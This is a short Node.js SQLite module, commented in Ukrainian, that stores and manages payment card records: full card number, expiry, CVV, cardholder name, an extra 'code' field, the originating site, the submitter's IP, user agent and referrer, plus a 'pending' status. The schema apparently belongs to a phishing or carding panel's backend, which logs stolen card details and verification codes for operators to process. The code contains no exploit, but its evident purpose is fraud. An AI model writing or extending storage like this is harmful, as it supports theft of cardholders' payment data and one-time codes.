const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const db = new sqlite3.Database(path.join(__dirname, 'cards.db'));

// Створюємо таблицю для карток, якщо вона не існує
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS cards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_number TEXT,
        exp_date TEXT,
        cvv TEXT,
        card_holder TEXT,
        code TEXT,
        site TEXT,
        ip TEXT,
        ua TEXT,
        referrer TEXT,
        status TEXT DEFAULT 'pending',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Функції для роботи з базою даних
const addCard = (cardData) => {
    return new Promise((resolve, reject) => {
        const { card_number, exp_date, cvv, card_holder, code, site, ip, ua, referrer } = cardData;
        db.run(
            `INSERT INTO cards (card_number, exp_date, cvv, card_holder, code, site, ip, ua, referrer) 
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [card_number, exp_date, cvv, card_holder, code, site, ip, ua, referrer],
            function(err) {
                if (err) reject(err);
                resolve(this.lastID);
            }
        );
    });
};

const getCards = () => {
    return new Promise((resolve, reject) => {
        db.all(`SELECT * FROM cards ORDER BY created_at DESC`, [], (err, rows) => {
            if (err) reject(err);
            resolve(rows);
        });
    });
};

const updateCardStatus = (id, status) => {
    return new Promise((resolve, reject) => {
        db.run(`UPDATE cards SET status = ? WHERE id = ?`, [status, id], function(err) {
            if (err) reject(err);
            resolve(this.changes);
        });
    });
};

const deleteCard = (id) => {
    return new Promise((resolve, reject) => {
        db.run(`DELETE FROM cards WHERE id = ?`, [id], function(err) {
            if (err) reject(err);
            resolve(this.changes);
        });
    });
};

module.exports = {
    addCard,
    getCards,
    updateCardStatus,
    deleteCard
}; 